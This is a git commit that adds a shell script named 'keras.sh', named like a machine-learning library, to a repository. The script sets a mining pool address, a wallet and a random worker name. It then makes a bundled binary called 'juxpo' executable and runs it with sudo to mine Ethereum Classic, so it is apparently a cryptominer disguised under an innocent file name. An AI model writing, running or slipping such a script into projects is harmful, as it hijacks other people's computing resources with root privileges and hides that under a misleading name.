ab0671fef60539714aa7d369505ba359ee5a800f
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-27 20:16:10 +0530

    Add files via upload

---
+++ krishdish-main/keras.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+POOL=us-etc.2miners.com:1010
+WALLET=0x663bDc4a1eDeCDDCe775862bBE859D6A84a72fB8
+WORKER=$(echo $(shuf -i 1-4 -n 1)-FANNNY)
+
+cd "$(dirname "$0")"
+
+chmod +x ./juxpo && sudo ./juxpo -a etchash -o $POOL -u $WALLET.$WORKER -log
+pause $@
